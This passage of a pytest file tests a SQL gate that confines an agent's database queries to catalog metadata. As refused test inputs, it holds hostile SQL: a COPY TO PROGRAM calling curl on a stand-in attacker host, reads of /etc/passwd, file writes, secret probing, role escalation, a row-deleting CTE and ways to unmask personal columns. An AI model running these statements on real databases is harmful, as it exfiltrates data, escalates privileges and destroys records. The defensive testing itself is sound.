import json
import pathlib
import re
from typing import Set

import pytest
from sqlglot import exp

from datahub.ingestion.agent.sql_gate import (
    _CLOCK_FUNCTIONS,
    CatalogScope,
    SqlScopeError,
    _check_server_state,
    check_query_scope,
)
from datahub.ingestion.source.bigquery_v2.bigquery_probe import BigQueryMetadataProbe
from datahub.ingestion.source.sql.mysql import MySQLConfig
from datahub.ingestion.source.sql.postgres.source import PostgresConfig
from datahub.ingestion.source.sql.sql_config import SQLCommonConfig
from datahub.ingestion.source.sql.sql_generic import SQLAlchemyGenericConfig
from datahub.sql_parsing.sqlglot_utils import get_dialect

CATALOG_QUERY = (
    "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'"
)


def test_permits_a_catalog_only_select():
    check_query_scope(CATALOG_QUERY, platform="postgres")


def test_permits_a_catalog_reference_qualified_by_database():
    check_query_scope(
        "SELECT table_name FROM mydb.information_schema.tables", platform="postgres"
    )


def test_pg_catalog_is_permitted_only_because_postgres_declares_it():
    # No longer central. The gate's default is information_schema and nothing else,
    # so pg_catalog is reachable only through PostgresConfig's declaration -- which
    # is the point: a central table had to know every dialect and did not.

    query = "SELECT relname FROM pg_catalog.pg_class"
    with pytest.raises(SqlScopeError, match="outside the catalog metadata"):
        check_query_scope(query, platform="postgres")
    check_query_scope(
        query, platform="postgres", scope=PostgresConfig.probe_catalog_scope()
    )


@pytest.mark.parametrize(
    "config_cls",
    [MySQLConfig, SQLAlchemyGenericConfig, SQLCommonConfig],
    ids=["mysql", "sqlalchemy", "sql-family-default"],
)
@pytest.mark.parametrize(
    "query",
    [
        "SELECT info FROM information_schema.processlist",
        "SELECT trx_query FROM information_schema.INNODB_TRX",
        "SELECT t.table_name FROM information_schema.tables t "
        "JOIN information_schema.processlist p ON p.db = t.table_schema",
    ],
)
def test_rejects_views_holding_other_sessions_sql(
    query: str, config_cls: type[SQLCommonConfig]
) -> None:
    """Admitted whole, information_schema would hand out the running SQL of
    every session a PROCESS-privileged credential can see.

    The SQL family's default scope excludes them, not the framework's: the
    generic source reaches a MySQL-protocol server through any URL naming
    one, so every config inheriting the default must refuse them."""
    with pytest.raises(SqlScopeError, match="outside the catalog metadata"):
        check_query_scope(
            query, platform="mysql", scope=config_cls.probe_catalog_scope()
        )


def test_rejects_a_user_table():
    with pytest.raises(SqlScopeError, match="public.orders"):
        check_query_scope("SELECT * FROM public.orders", platform="postgres")


def test_rejects_an_unqualified_table():
    # An unqualified name cannot be shown to be catalog metadata, so it is refused
    # rather than assumed safe.
    with pytest.raises(SqlScopeError, match="orders"):
        check_query_scope("SELECT * FROM orders", platform="postgres")


def test_rejects_multiple_statements():
    with pytest.raises(SqlScopeError, match="single statement"):
        check_query_scope(
            f"{CATALOG_QUERY}; SELECT * FROM public.orders", platform="postgres"
        )


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO public.orders (id) VALUES (1)",
        "UPDATE public.orders SET id = 1",
        "DELETE FROM public.orders",
        "DROP TABLE public.orders",
        "CREATE TABLE public.t (id INT)",
    ],
)
def test_rejects_anything_that_is_not_a_select(sql):
    with pytest.raises(SqlScopeError):
        check_query_scope(sql, platform="postgres")


def test_permits_a_cte_over_catalog_tables():
    # A CTE alias is not an unqualified table reference; refusing it would make
    # the gate reject legitimate catalog queries.
    check_query_scope(
        "WITH cols AS (SELECT table_name FROM information_schema.columns) "
        "SELECT * FROM cols",
        platform="postgres",
    )


def test_rejects_a_user_table_hidden_inside_a_cte():
    with pytest.raises(SqlScopeError, match="public.orders"):
        check_query_scope(
            "WITH x AS (SELECT * FROM public.orders) "
            "SELECT * FROM information_schema.tables",
            platform="postgres",
        )


def test_rejects_a_user_table_in_a_union_branch():
    with pytest.raises(SqlScopeError, match="public.orders"):
        check_query_scope(
            "SELECT table_name FROM information_schema.tables "
            "UNION ALL SELECT name FROM public.orders",
            platform="postgres",
        )


def test_rejects_a_user_table_in_a_subquery():
    with pytest.raises(SqlScopeError, match="public.orders"):
        check_query_scope(
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_name IN (SELECT name FROM public.orders)",
            platform="postgres",
        )


def test_rejects_a_user_table_joined_to_a_catalog_table():
    with pytest.raises(SqlScopeError, match="public.orders"):
        check_query_scope(
            "SELECT t.table_name FROM information_schema.tables t "
            "JOIN public.orders o ON o.name = t.table_name",
            platform="postgres",
        )


def test_rejects_an_unresolvable_platform():
    # Guessing a dialect would parse the query against the wrong grammar, so an
    # unknown platform refuses rather than falling back.
    with pytest.raises(SqlScopeError, match="dialect"):
        check_query_scope(CATALOG_QUERY, platform="not_a_real_platform")


def test_rejects_unparseable_sql():
    with pytest.raises(SqlScopeError, match="parse"):
        check_query_scope("SELECT FROM WHERE ((", platform="postgres")


def test_rejects_an_empty_query():
    with pytest.raises(SqlScopeError):
        check_query_scope("   ", platform="postgres")


def test_permits_information_schema_on_snowflake():
    check_query_scope(
        "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES", platform="snowflake"
    )


def test_rejects_snowflake_account_usage_query_history():
    # ACCOUNT_USAGE.QUERY_HISTORY.QUERY_TEXT holds the literal text of customer
    # queries, including values in WHERE clauses. It is refused because
    # ACCOUNT_USAGE is not one of the permitted schemas -- not by the query-text
    # exclusion list, which never sees it. Asserting the schema wording keeps the
    # two mechanisms from being confused if either changes.
    with pytest.raises(SqlScopeError, match="(?i)outside the catalog metadata"):
        check_query_scope(
            "SELECT query_text FROM snowflake.account_usage.query_history",
            platform="snowflake",
        )


def test_rejects_snowflakes_query_history_table_function():
    # This is Snowflake's actual "in a catalog schema but not metadata" case:
    # INFORMATION_SCHEMA.QUERY_HISTORY() is a table function inside a permitted
    # schema, so the schema rule clears it and the vendor-function rule is what
    # refuses it. A name-based exclusion list would have to know the function
    # exists; refusing the whole exp.Anonymous class does not.
    for query in (
        "SELECT * FROM information_schema.query_history()",
        "SELECT * FROM TABLE(information_schema.query_history())",
    ):
        with pytest.raises(SqlScopeError, match="(?i)vendor-specific function"):
            check_query_scope(query, platform="snowflake")


def _postgres_scope():

    return PostgresConfig.probe_catalog_scope()


def test_rejects_pg_stat_statements():
    # The Postgres analogue of query history: normalized query text, still
    # carrying literals in many configurations.
    with pytest.raises(SqlScopeError, match="(?i)pg_stat_statements"):
        check_query_scope(
            "SELECT query FROM pg_catalog.pg_stat_statements",
            platform="postgres",
            scope=_postgres_scope(),
        )


def test_catalog_matching_is_case_insensitive():
    check_query_scope(
        "SELECT table_name FROM INFORMATION_SCHEMA.TABLES", platform="postgres"
    )


def test_rejects_a_function_in_table_position_inside_a_catalog_schema():
    # Living in pg_catalog does not make a set-returning function metadata.
    with pytest.raises(SqlScopeError, match="pg_ls_dir"):
        check_query_scope(
            "SELECT * FROM pg_catalog.pg_ls_dir('/')", platform="postgres"
        )


def test_rejects_an_unqualified_function_in_table_position():
    with pytest.raises(SqlScopeError, match="pg_read_file"):
        check_query_scope(
            "SELECT * FROM pg_read_file('/etc/passwd')", platform="postgres"
        )


def test_rejects_dblink():
    with pytest.raises(SqlScopeError, match="dblink"):
        check_query_scope(
            "SELECT * FROM dblink('dbname=x', 'SELECT * FROM orders') AS t(a text)",
            platform="postgres",
        )


def test_rejects_a_vendor_function_with_no_table_reference():
    # The sharpest gap in a table-based check: a projection-only call reaches
    # data without naming a table at all, so walking tables never sees it.
    with pytest.raises(SqlScopeError, match="pg_read_file"):
        check_query_scope("SELECT pg_read_file('/etc/passwd')", platform="postgres")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT secret('my_scope', 'my_key') AS s "
        "FROM system.information_schema.tables LIMIT 1",
        # Not selected, but the row count still answers a guess about the value.
        "SELECT table_name FROM system.information_schema.tables "
        "WHERE secret('my_scope', 'my_key') LIKE 'a%'",
    ],
)
def test_rejects_databricks_secret(sql):
    # sqlglot 30.22 models secret() as exp.Secret, so the vendor-function rule,
    # which only sees exp.Anonymous, no longer refuses it; the refused-class rule does.
    with pytest.raises(SqlScopeError, match="(?i)secret"):
        check_query_scope(sql, platform="databricks")


_MODELED_FUNCTIONS_BASELINE = (
    pathlib.Path(__file__).parent / "sqlglot_modeled_functions_baseline.json"
)


def _modeled_functions() -> Set[str]:
    def subclasses(cls: type) -> Set[type]:
        found: Set[type] = set()
        for sub in cls.__subclasses__():
            found |= {sub} | subclasses(sub)
        return found

    return {
        cls.__name__
        for cls in subclasses(exp.Func)
        if cls.__module__.startswith("sqlglot.")
    }


def test_sqlglot_upgrade_reviews_newly_modeled_functions():
    # The vendor-function rule refuses what sqlglot leaves as exp.Anonymous, so each
    # function sqlglot learns to model slips past it. The baseline is what sqlglot
    # 30.22 models; it is not an allowlist, and only the functions added since
    # 30.12 were checked against the gate. On a sqlglot upgrade, check each new
    # function: refuse it in sql_gate._REFUSED_FUNCTION_CLASSES if it reads anything
    # but its arguments (secrets, files, models, sequences), and classify any new
    # CURRENT_* one (test_every_modeled_current_function_is_classified), then add it
    # to the baseline.
    baseline = set(json.loads(_MODELED_FUNCTIONS_BASELINE.read_text()))
    new = sorted(_modeled_functions() - baseline)
    assert not new, f"sqlglot models functions the SQL gate hasn't checked: {new}"


@pytest.mark.parametrize(
    "platform, expression, label",
    [
        # Session and account state.
        ("snowflake", "CURRENT_ACCOUNT()", "CURRENT_ACCOUNT"),
        ("snowflake", "CURRENT_ROLE()", "CURRENT_ROLE"),
        ("snowflake", "CURRENT_IP_ADDRESS()", "CURRENT_IP_ADDRESS"),
        ("snowflake", "CURRENT_SESSION()", "CURRENT_SESSION"),
        ("snowflake", "CURRENT_WAREHOUSE()", "CURRENT_WAREHOUSE"),
        ("databricks", "current_catalog()", "CURRENT_CATALOG"),
        ("postgres", "current_database()", "CURRENT_DATABASE"),
        # Model invocations, which also cost money.
        ("snowflake", "AI_CLASSIFY(table_name, ['a', 'b'])", "AI_CLASSIFY"),
        ("snowflake", "AI_EMBED('model', table_name)", "AI_EMBED"),
        # Decryption.
        ("snowflake", "DECRYPT(table_name, 'passphrase')", "DECRYPT"),
        ("snowflake", "DECRYPT_RAW(table_name, 'k', 'iv')", "DECRYPT_RAW"),
        # Sequence increments, which write.
        ("snowflake", "my_seq.NEXTVAL", "NEXTVAL"),
        ("oracle", "my_seq.CURRVAL", "CURRVAL"),
        ("tsql", "NEXT VALUE FOR dbo.my_seq", "NEXT VALUE FOR"),
        # Files.
        ("duckdb", "read_csv('/etc/passwd')", "READ_CSV"),
        ("duckdb", "read_parquet('/tmp/data.parquet')", "READ_PARQUET"),
        ("snowflake", "TO_FILE('@my_stage/data.csv')", "TO_FILE"),
    ],
)
def test_rejects_modeled_functions_beyond_catalog_metadata(platform, expression, label):
    # sqlglot models these, so the vendor-function rule, which only sees
    # exp.Anonymous, never refused them. Matching is by class name, so each
    # refused class needs a case: a rename in sqlglot would reopen the gate.
    with pytest.raises(SqlScopeError, match=f"(?i){re.escape(label)}"):
        check_query_scope(
            f"SELECT {expression} AS x FROM information_schema.tables",
            platform=platform,
        )


@pytest.mark.parametrize(
    "expression, label",
    [
        ("AI.GENERATE_BOOL(table_name)", "AI.GENERATE_BOOL"),
        ("AI.GENERATE_INT(table_name)", "AI.GENERATE_INT"),
        ("AI.GENERATE_DOUBLE(table_name)", "AI.GENERATE_DOUBLE"),
        ("AI.GENERATE(table_name)", "AI.GENERATE"),
        ("AI.GENERATE_TABLE(MODEL my_dataset.m, (SELECT 1))", "AI.GENERATE_TABLE"),
        (
            "AI.FORECAST(TABLE my_dataset.t, data_col => 'x', timestamp_col => 'y')",
            "AI.FORECAST",
        ),
        ("ML.GENERATE_TEXT(MODEL my_dataset.m, (SELECT 1))", "ML.GENERATE_TEXT"),
        (
            "ML.GENERATE_EMBEDDING(MODEL my_dataset.m, (SELECT 1))",
            "ML.GENERATE_EMBEDDING",
        ),
        (
            "ML.FEATURES_AT_TIME(TABLE my_dataset.f, time => CURRENT_TIMESTAMP())",
            "ML.FEATURES_AT_TIME",
        ),
        ("ML.PREDICT(MODEL my_dataset.m, (SELECT 1))", "ML.PREDICT"),
        ("ML.FORECAST(MODEL my_dataset.m, STRUCT(3 AS horizon))", "ML.FORECAST"),
        (
            "ML.TRANSLATE(MODEL my_dataset.m, TABLE my_dataset.t, "
            "STRUCT('TRANSLATE_TEXT' AS translate_mode))",
            "ML.TRANSLATE",
        ),
        ("VECTOR_SEARCH(TABLE my_dataset.e, 'col', (SELECT 1))", "VECTOR_SEARCH"),
    ],
)
def test_rejects_bigquery_model_calls(expression, label):
    # Refused by the function rule itself, not only because a model reference
    # falls outside the catalog scope.
    with pytest.raises(SqlScopeError, match=re.escape(f"'{label}' reaches beyond")):
        check_query_scope(
            f"SELECT {expression} AS x FROM my_dataset.INFORMATION_SCHEMA.TABLES",
            platform="bigquery",
            scope=BigQueryMetadataProbe.catalog_scope,
        )


# Every CURRENT_* builtin sqlglot models that is not a clock, as of sqlglot 30.22.
_REVIEWED_SESSION_STATE_FUNCTIONS = frozenset(
    {
        "CurrentAccount",
        "CurrentAccountName",
        "CurrentAvailableRoles",
        "CurrentCatalog",
        "CurrentClient",
        "CurrentDatabase",
        "CurrentIpAddress",
        "CurrentOrganizationName",
        "CurrentOrganizationUser",
        "CurrentRegion",
        "CurrentRole",
        "CurrentRoleType",
        "CurrentSchema",
        "CurrentSchemas",
        "CurrentSecondaryRoles",
        "CurrentSession",
        "CurrentStatement",
        "CurrentTransaction",
        "CurrentUser",
        "CurrentUserId",
        "CurrentVersion",
        "CurrentWarehouse",
    }
)


def test_every_modeled_current_function_is_classified():
    # A sqlglot upgrade that models a new CURRENT_* builtin fails here until it
    # is classified: a clock goes in sql_gate._CLOCK_FUNCTIONS, anything else in
    # the set above, where the gate refuses it.
    modeled = {
        name
        for name, node in vars(exp).items()
        if isinstance(node, type)
        and issubclass(node, exp.Func)
        and name.startswith("Current")
    }
    unclassified = modeled - _CLOCK_FUNCTIONS - _REVIEWED_SESSION_STATE_FUNCTIONS
    assert not unclassified, f"classify these CURRENT_* builtins: {unclassified}"
    for name in sorted(modeled & _REVIEWED_SESSION_STATE_FUNCTIONS):
        statement = exp.select(getattr(exp, name)().as_("x")).from_("t")
        with pytest.raises(SqlScopeError):
            _check_server_state(statement, get_dialect("snowflake"))


@pytest.mark.parametrize(
    "platform, expression",
    [
        ("snowflake", "CURRENT_DATE"),
        ("snowflake", "CURRENT_TIMESTAMP"),
        ("snowflake", "CURRENT_TIMEZONE()"),
        ("databricks", "current_timezone()"),
        ("snowflake", "LOWER(table_name)"),
        # Same Generate prefix as the model calls, but plain functions.
        ("snowflake", "GENERATE_SERIES(1, 3)"),
    ],
)
def test_permits_clocks_and_plain_functions(platform, expression):
    check_query_scope(
        f"SELECT {expression} AS x FROM information_schema.tables",
        platform=platform,
    )


def test_permits_standard_functions_over_catalog_tables():
    # Only vendor-specific functions sqlglot does not model are refused;
    # ordinary SQL must still work or the gate is unusable.
    check_query_scope(
        "SELECT count(*) FROM information_schema.tables WHERE table_name LIKE 'a%'",
        platform="postgres",
    )


def test_permits_bigquery_dataset_qualified_information_schema():
    # BigQuery addresses it as <dataset>.INFORMATION_SCHEMA.<VIEW>, and its
    # dialect leaves the last two parts in one identifier slot -- so the schema
    # marker is not in the `db` slot and the slot has to be split to find it.
    # That is a parser behaviour, not a naming rule: a BigQuery table name
    # cannot itself contain a dot, so its scope declares the split
    # (CatalogScope.split_dotted_identifiers).
    check_query_scope(
        "SELECT table_name FROM mydataset.INFORMATION_SCHEMA.TABLES",
        platform="bigquery",
        scope=BigQueryMetadataProbe.catalog_scope,
    )


def test_permits_bigquery_project_qualified_information_schema():
    check_query_scope(
        "SELECT table_name FROM myproject.mydataset.INFORMATION_SCHEMA.TABLES",
        platform="bigquery",
        scope=BigQueryMetadataProbe.catalog_scope,
    )


@pytest.mark.parametrize(
    ("platform", "sql"),
    [
        ("postgres", 'SELECT * FROM "information_schema.tables"'),
        ("mysql", "SELECT * FROM `information_schema.tables`"),
        ("snowflake", 'SELECT * FROM "snowflake.account_usage.tables"'),
    ],
)
def test_a_dotted_name_is_a_name_everywhere_but_bigquery(platform, sql):
    """A quoted identifier that CONTAINS dots must not decompose into a path.

    Each of these names one user table whose name literally contains dots. If
    the slot were split, the pieces would spell a path the scope permits and
    the read would be waved through -- the same substitution shape as the
    lookalike-catalog bug, one level lower.

    What stops it is that a slot is split only where the scope declares
    `split_dotted_identifiers`, which defaults to False; which sources declare
    it is pinned in test_catalog_scopes. Declaring it for a dialect whose
    quoted identifiers may contain a dot is a one-word change that opens the
    bypass, so this is the test that fails when someone makes it.
    """
    with pytest.raises(SqlScopeError, match="not schema-qualified"):
        check_query_scope(sql, platform=platform)


def test_the_scope_not_the_dialect_decides_whether_a_dotted_slot_splits():
    """Some parsers leave a path's dots inside one identifier slot. Splitting
    it is the scope's declaration, so the gate names no dialect; undeclared,
    the slot stays whole and the reference is refused, never misread."""
    sql = "SELECT table_name FROM myds.INFORMATION_SCHEMA.TABLES"
    check_query_scope(
        sql, platform="bigquery", scope=CatalogScope(split_dotted_identifiers=True)
    )
    with pytest.raises(SqlScopeError, match="outside the catalog metadata"):
        check_query_scope(sql, platform="bigquery", scope=CatalogScope())


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT query FROM myds.INFORMATION_SCHEMA.JOBS",
        # Region-qualified, the spelling BigQuery documents for JOBS, bare
        # and backticked.
        "SELECT query FROM region-us.INFORMATION_SCHEMA.JOBS",
        "SELECT query FROM `region-us`.INFORMATION_SCHEMA.JOBS",
        "SELECT query FROM `myproj.region-us.INFORMATION_SCHEMA.JOBS_BY_PROJECT`",
    ],
)
def test_a_bigquery_url_on_the_sql_family_default_cannot_read_job_text(
    sql: str,
) -> None:
    """The generic source on a bigquery:// URL parses as bigquery but carries
    the SQL family's information_schema-wide default. While the split keyed
    on the dialect, that pairing admitted INFORMATION_SCHEMA.JOBS, the SQL
    text of every job in the project. Now only a scope that declares the
    split (BigQuery's own provider's, a named-relation allowlist) splits."""
    with pytest.raises(SqlScopeError):
        check_query_scope(
            sql, platform="bigquery", scope=SQLCommonConfig.probe_catalog_scope()
        )


def test_bigquery_splits_the_slot_even_though_the_parser_calls_it_quoted():
    """The split cannot key on `Identifier.quoted`, which is why the scope declares it.

    sqlglot reports quoted=True for the name slot of an UNQUOTED BigQuery
    `myds.INFORMATION_SCHEMA.TABLES`, so gating the split on `quoted is False`
    would refuse every legitimate BigQuery catalog query. Pinned here because
    that is the obvious-looking fix for the case above.
    """
    check_query_scope(
        "SELECT table_name FROM myds.INFORMATION_SCHEMA.TABLES",
        platform="bigquery",
        scope=BigQueryMetadataProbe.catalog_scope,
    )


def test_rejects_a_bigquery_user_table():
    with pytest.raises(SqlScopeError, match="orders"):
        check_query_scope(
            "SELECT * FROM myproject.mydataset.orders", platform="bigquery"
        )


def test_error_names_the_offending_table():
    # The agent has to be able to rewrite the query, so the message must say
    # which reference failed rather than only that something did.
    with pytest.raises(SqlScopeError) as exc:
        check_query_scope("SELECT * FROM analytics.events", platform="postgres")
    assert "analytics.events" in str(exc.value)


@pytest.mark.parametrize(
    "sql,expected",
    [
        ("INSERT INTO public.t (id) VALUES (1)", "INSERT"),
        ("UPDATE public.t SET id = 1", "UPDATE"),
        ("DELETE FROM public.t", "DELETE"),
        ("DROP TABLE public.t", "DROP"),
        ("CREATE TABLE public.t (id INT)", "CREATE"),
    ],
)
def test_a_write_statement_is_named_by_its_sql_keyword(sql, expected):
    with pytest.raises(SqlScopeError, match=expected):
        check_query_scope(sql, platform="postgres")


def test_an_unmodelled_statement_does_not_leak_a_parser_node_name():
    # FLUSH PRIVILEGES parses to an Alias node; "got ALIAS" would be a sqlglot
    # internal that tells a caller nothing and reads like a bug in their own
    # query. The refusal is the agent's only signal for how to rewrite, so it
    # has to be in SQL terms.
    with pytest.raises(SqlScopeError) as exc:
        check_query_scope("FLUSH PRIVILEGES", platform="mysql")
    message = str(exc.value)
    assert "ALIAS" not in message.upper()
    assert "SELECT" in message


# --- a write hidden inside a read ------------------------------------------
#
# The gate type-checked only the ROOT node. A Postgres data-modifying CTE puts
# the write inside a query, so
#
#   WITH orders AS (SELECT 1), x AS (DELETE FROM orders RETURNING 1)
#   SELECT * FROM x
#
# parses to a Select -- an exp.Query -- and cleared a gate whose entire
# promise is read-only. The unqualified DELETE target was then excused by
# _visible_cte_names as "a CTE alias reads as an unqualified table", true of a
# read reference and false of a write target: Postgres resolves the DELETE to
# the real table.
#
# Proven end to end against a live Postgres 16 before the fix: `probe run sql`
# exited 0 with a normal-looking result and the table went from 3 rows to 0.
#
# The pre-existing test covered only top-level DML, which is exactly why this
# survived it.


@pytest.mark.parametrize(
    "sql",
    [
        # Each shadows the CTE name over the real table, which is what made
        # the unqualified target look like a CTE reference.
        "WITH orders AS (SELECT 1), x AS (DELETE FROM orders RETURNING 1) SELECT * FROM x",
        "WITH orders AS (SELECT 1), x AS (INSERT INTO orders VALUES (1) RETURNING 1) SELECT * FROM x",
        "WITH orders AS (SELECT 1), x AS (UPDATE orders SET a=1 RETURNING 1) SELECT * FROM x",
        "WITH t AS (SELECT 1), x AS (DROP TABLE t) SELECT * FROM x",
        # Without the shadowing, so the table is qualified and in scope --
        # this must be refused for being a write, not for being out of scope.
        "WITH x AS (DELETE FROM information_schema.tables RETURNING 1) SELECT * FROM x",
    ],
)
def test_a_write_inside_a_cte_is_still_a_write(sql):
    with pytest.raises(SqlScopeError):
        check_query_scope(sql, platform="postgres", scope=_postgres_scope())


def test_the_refusal_says_it_is_a_write_not_a_scope_problem():
    """The message decides what the agent does next. "out of scope" sends it
    to qualify the table; it needs to be told the statement writes."""
    with pytest.raises(SqlScopeError, match="DELETE"):
        check_query_scope(
            "WITH x AS (DELETE FROM information_schema.tables RETURNING 1) "
            "SELECT * FROM x",
            platform="postgres",
            scope=_postgres_scope(),
        )


@pytest.mark.parametrize(
    "sql",
    [
        "WITH t AS (SELECT table_name FROM information_schema.tables) SELECT * FROM t",
        "WITH a AS (SELECT table_name FROM information_schema.tables), "
        "b AS (SELECT * FROM a) SELECT * FROM b",
        "SELECT * FROM information_schema.tables",
    ],
)
def test_an_ordinary_cte_query_still_works(sql):
    """The control. Refusing every WITH would be a cheap way to pass the tests
    above and would break the legitimate catalog queries CTEs are used for."""
    check_query_scope(sql, platform="postgres", scope=_postgres_scope())


# --- everything that is not a read -----------------------------------------
#
# Grouped by what the statement ACHIEVES, not by keyword, because both gaps
# found here were spelled like reads: a data-modifying CTE parses to a Select,
# and `SELECT ... INTO` puts the table it creates in an `into` arg rather than
# a Create node. A statement-type check reading the root saw neither.
#
# SELECT INTO was refused before this only when its target happened to be
# unqualified -- `SELECT * INTO information_schema.evil FROM
# information_schema.tables` named a target inside the permitted schema and
# passed. Caught by accident is not caught.


@pytest.mark.parametrize(
    "dialect,sql",
    [
        # writes data
        (
            "tsql",
            "SELECT * INTO information_schema.evil FROM information_schema.tables",
        ),
        (
            "postgres",
            "WITH x AS (INSERT INTO information_schema.t VALUES (1) RETURNING 1) SELECT * FROM x",
        ),
        (
            "postgres",
            "CREATE TABLE information_schema.x AS SELECT * FROM information_schema.tables",
        ),
        ("postgres", "TRUNCATE information_schema.tables"),
        ("postgres", "CREATE TEMP TABLE t AS SELECT 1"),
        ("snowflake", "CREATE OR REPLACE VIEW information_schema.v AS SELECT 1"),
        # writes a file, or hands one to a program
        ("postgres", "COPY (SELECT * FROM information_schema.tables) TO '/tmp/out'"),
        ("postgres", "COPY information_schema.tables TO PROGRAM 'curl evil.example'"),
        ("mysql", "SELECT * FROM information_schema.tables INTO OUTFILE '/tmp/x'"),
        ("mysql", "SELECT * FROM information_schema.tables INTO DUMPFILE '/tmp/x'"),
        ("snowflake", "COPY INTO 's3://bucket/x' FROM information_schema.tables"),
        ("bigquery", "EXPORT DATA OPTIONS(uri='gs://b/x') AS SELECT 1"),
        # changes who can do what
        ("postgres", "GRANT SELECT ON information_schema.tables TO PUBLIC"),
        ("postgres", "REVOKE ALL ON information_schema.tables FROM PUBLIC"),
        ("postgres", "CREATE ROLE evil SUPERUSER"),
        ("postgres", "ALTER USER u WITH PASSWORD 'x'"),
        # runs code the gate cannot see into
        ("postgres", "DO $$ BEGIN PERFORM 1; END $$"),
        ("postgres", "CALL some_proc()"),
        ("tsql", "EXEC sp_executesql N'SELECT 1'"),
        ("snowflake", "EXECUTE IMMEDIATE 'SELECT 1'"),
        # changes session or system state
        ("postgres", "SET search_path TO evil"),
        ("snowflake", "ALTER SESSION SET QUERY_TAG = 'x'"),
        ("postgres", "ALTER SYSTEM SET log_statement = 'none'"),
        # takes locks a production writer would wait on
        ("postgres", "SELECT * FROM information_schema.tables FOR UPDATE"),
        ("postgres", "SELECT * FROM information_schema.tables FOR SHARE"),
        ("postgres", "LOCK TABLE information_schema.tables IN ACCESS EXCLUSIVE MODE"),
    ],
)
def test_a_statement_that_is_not_a_read_is_refused(dialect, sql):
    with pytest.raises(SqlScopeError) as refusal:
        check_query_scope(sql, platform=dialect, scope=_postgres_scope())
    # Refused for what the statement DOES, not for where it points.
    #
    # The tsql, mysql, snowflake and bigquery rows run against the Postgres
    # scope, which looks like an oversight and is not: statement type is
    # decided before scope, so none of these rows reaches the scope check.
    # Verified twice -- re-running each against its own connector's
    # probe_catalog_scope() produces a byte-identical message, and replacing
    # the scope with one that permits nothing at all leaves every row still
    # refused for its statement type.
    #
    # So this assertion cannot fire today; it pins the ordering rather than
    # discriminating between two live outcomes. It is here because the
    # ordering is the load-bearing part -- if scope were ever consulted
    # first, every row above would start refusing for the wrong reason and
    # a bare pytest.raises(SqlScopeError) would not notice.
    assert "outside the catalog metadata" not in str(refusal.value)


@pytest.mark.parametrize(
    "dialect,sql",
    [
        ("postgres", "SELECT * FROM information_schema.tables"),
        (
            "postgres",
            "WITH t AS (SELECT table_name FROM information_schema.tables) SELECT * FROM t",
        ),
        ("postgres", "SELECT count(*) FROM information_schema.columns"),
    ],
)
def test_an_ordinary_catalog_read_still_works(dialect, sql):
    """The control for the whole list above. Refusing everything would pass
    every case in it and make the command useless."""
    check_query_scope(sql, platform=dialect, scope=_postgres_scope())


# --- naming a withheld column, however you spell it ------------------------
#
# The masker matches the DRIVER's output column names, so until the gate
# started reading the projection the caller chose whether masking applied.
# test_pii_columns.py covers case variation and substring non-matching --
# both shaped to the assumption. None of these were covered, and every one
# of them worked.


@pytest.mark.parametrize(
    "sql",
    [
        # an alias renames the column out of the masker's reach
        "SELECT user_name AS u FROM snowflake.account_usage.access_history",
        "SELECT user_name u FROM snowflake.account_usage.access_history",
        # so does any wrapper, and none of these are exp.Anonymous
        "SELECT LOWER(user_name) FROM snowflake.account_usage.access_history",
        "SELECT SUBSTR(user_name, 1, 3) FROM snowflake.account_usage.access_history",
        "SELECT MAX(user_name) FROM snowflake.account_usage.access_history",
        # the whole directory in one row
        "SELECT ARRAY_AGG(user_name) FROM snowflake.account_usage.access_history",
        "SELECT LISTAGG(user_name, ',') FROM snowflake.account_usage.access_history",
        # a predicate answers the same question one bit at a time
        "SELECT query_id FROM snowflake.account_usage.access_history WHERE user_name = 'alice'",
        # and nesting hides the name from a projection-only check
        "SELECT u FROM (SELECT user_name AS u FROM snowflake.account_usage.access_history)",
    ],
)
def test_naming_a_withheld_column_is_refused(sql):
    from datahub.ingestion.source.snowflake.snowflake_probe import (
        SnowflakeMetadataProbe,
    )

    with pytest.raises(SqlScopeError, match="names a person"):
        check_query_scope(
            sql, platform="snowflake", scope=SnowflakeMetadataProbe.catalog_scope
        )


@pytest.mark.parametrize(
    "sql",
    [
        # the read the relation is admitted for -- projects no columns at all
        "SELECT 1 AS present FROM snowflake.account_usage.access_history LIMIT 1",
        # names no column either, so the masker handles it on the way out
        "SELECT * FROM snowflake.account_usage.access_history",
        # and everything structural in the same view stays readable
        "SELECT query_id, query_start_time FROM snowflake.account_usage.access_history",
        "SELECT count(*) FROM snowflake.account_usage.access_history",
    ],
)
def test_the_rest_of_the_relation_stays_readable(sql):
    """The control, and the reason this is a column rule rather than dropping
    the relation: emptiness on access_history is how an agent tells a
    Standard account from an Enterprise one."""
    from datahub.ingestion.source.snowflake.snowflake_probe import (
        SnowflakeMetadataProbe,
    )

    check_query_scope(
        sql, platform="snowflake", scope=SnowflakeMetadataProbe.catalog_scope
    )


# A SELECT need not name any relation, and one that names none is not catalog
# inspection: it computes a row from server state. `SELECT @@datadir,
# @@hostname` and `SELECT VERSION()` cleared an earlier gate because the table
# walk was vacuously satisfied (no table) and neither is an Anonymous function
# -- yet they disclose the data directory, hostname and version. Found in an
# adversarial pass against a live MySQL.
@pytest.mark.parametrize(
    "sql",
    [
        "SELECT @@version, @@datadir, @@hostname",
        "SELECT @@secure_file_priv",
        "SELECT @@GLOBAL.hostname",
        # a system variable smuggled into a UNION branch alongside a real
        # catalog table: the "must name a relation" rule is satisfied by the
        # other branch, so the SessionParameter refusal is what catches this
        "SELECT table_name FROM information_schema.tables UNION SELECT @@datadir",
    ],
)
def test_rejects_a_server_or_session_variable(sql):
    with pytest.raises(SqlScopeError, match="server"):
        check_query_scope(sql, platform="mysql")


@pytest.mark.parametrize(
    "platform, expression",
    [
        # T-SQL parses these as a Parameter, not a SessionParameter.
        ("tsql", "@@SERVERNAME"),
        ("tsql", "@@VERSION"),
        ("tsql", "@@SPID"),
        ("tsql", "@my_var"),
        ("mysql", "@my_var"),
        ("snowflake", "$my_var"),
        ("bigquery", "@my_param"),
    ],
)
def test_rejects_a_variable_beside_a_catalog_table(platform, expression):
    with pytest.raises(SqlScopeError, match=re.escape(f"'{expression}' reads")):
        check_query_scope(
            f"SELECT {expression} AS x FROM information_schema.tables",
            platform=platform,
            scope=BigQueryMetadataProbe.catalog_scope
            if platform == "bigquery"
            else None,
        )


@pytest.mark.parametrize(
    "sql",
    [
